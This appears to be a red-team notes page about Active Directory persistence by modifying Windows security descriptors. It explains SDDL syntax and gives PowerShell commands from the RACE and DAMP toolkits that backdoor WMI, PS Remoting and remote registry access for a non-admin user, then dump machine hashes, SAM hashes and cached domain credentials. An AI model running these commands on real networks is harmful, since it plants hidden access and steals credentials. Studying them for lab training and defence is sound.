# Security Descriptors

## Format

Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor.

{% tabs %}
{% tab title="Syntax" %}
`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
{% endtab %}
{% endtabs %}

Detailed docs about SDDL:

{% embed url="https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings" %}

## Exploitation

Once we have administrator privileges it is possible to create a backdoor by modifying Security Descriptors like Owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.

### WMI - GUI

It is possible to add the non-admin user to the ACE using the `Component Services` and `Computer Management`.

<figure><img src="../assets/image (1).png" alt=""><figcaption><p>Component Services</p></figcaption></figure>

<figure><img src="../assets/image (2).png" alt=""><figcaption><p>Computer Management</p></figcaption></figure>

Apply to all namespaces

<figure><img src="../assets/image (4).png" alt=""><figcaption><p>Computer Management</p></figcaption></figure>

<pre class="language-powershell"><code class="lang-powershell"><strong># Check if worked
</strong><strong># Worked if didn't get access denied 
</strong><strong>gwmi -class win32_operatingsystem -ComputerName &#x3C;dc_machine>
</strong></code></pre>

### WMI - PowerShell

ACE for built-in administrators for WMI namespaces `A;CI;CCDCLCSWRPWPRCWD;;;SID`

in order to get access to WMI namespaces attacker needs to create a new ACE with the `SID` to non-admin user which he controls.

ACLs can be modified to allow non-admin users using the [RACE toolkit](https://github.com/samratashok/RACE):

{% hint style="danger" %}
Require Domain Admin privileges
{% endhint %}

<pre class="language-powershell"><code class="lang-powershell"># Loading the module
. C:\AD\Tools\RACE.ps1

# Remove namespace if you want in root namespace by default
<strong>Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
</strong>
# with explicit credentials
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

# Remove
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose


</code></pre>

PS Remoting (not stable after August 2020 patches)

<pre class="language-powershell"><code class="lang-powershell"># View PSSession Config
Get-PSSessionConfiguration
<strong>
</strong><strong># Run in dcorp-dc
</strong>Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
#If you got an error like I/O operation has been aborted. Then the command succeeded.

# Remove
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
</code></pre>

### Remote Registry

**Reg backdoo**r using [DAMP](https://github.com/HarmJ0y/DAMP) Tool allows to non-admin user to retrieve the hash of the computer, the SAM and cached credentials in the computer:

<pre class="language-powershell"><code class="lang-powershell"># Modify ACE with admin privs. Run in DC
<strong>Add-RemoteRegBackdoor -ComputerName &#x3C;remotehost> -Trustee student1 -Verbose
</strong>
# retrieve machine hash
Get-RemoteMachineAccountHash -ComputerName &#x3C;remotehost> -Verbose

# retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName &#x3C;remotehost> -Verbose

# retrieve domain cached credentials
Get-RemoteCachedCredential -ComputerName &#x3C;remotehost> -Verbose
</code></pre>
